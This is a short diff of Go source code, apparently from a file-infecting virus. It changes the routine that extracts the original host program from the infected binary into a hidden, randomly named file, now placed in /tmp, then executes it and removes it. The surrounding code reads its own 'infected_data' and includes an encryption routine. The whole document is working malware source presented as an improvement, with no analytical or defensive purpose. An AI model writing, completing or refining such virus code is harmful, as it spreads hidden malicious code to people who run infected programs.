@@ -121,7 +121,7 @@ func RunHost() {
 
 	hostbytes := "." + Rnd(8) //generate hidden random name
 
-	h, err := os.Create(hostbytes) //create tmp with above name
+	h, err := os.Create("/tmp/" + hostbytes) //create tmp with above name
 	check(err)
 
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
@@ -146,8 +146,8 @@ func RunHost() {
 	f.Close()
 
 	args := os.Args[1:]
-	os.Chmod(hostbytes, 0755) //give it proper permissions
-	cmd := exec.Command("./"+hostbytes, args...)
+	os.Chmod("/tmp/"+hostbytes, 0755) //give it proper permissions
+	cmd := exec.Command("/tmp/"+hostbytes, args...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	cmd.Env = os.Environ()
@@ -157,7 +157,7 @@ func RunHost() {
 		Pgid:      0,
 	}
 	cmd.Run()
-	os.Remove(hostbytes)
+	os.Remove("/tmp/" + hostbytes)
 }
 
 func Encrypt(toEnc []byte) []byte {
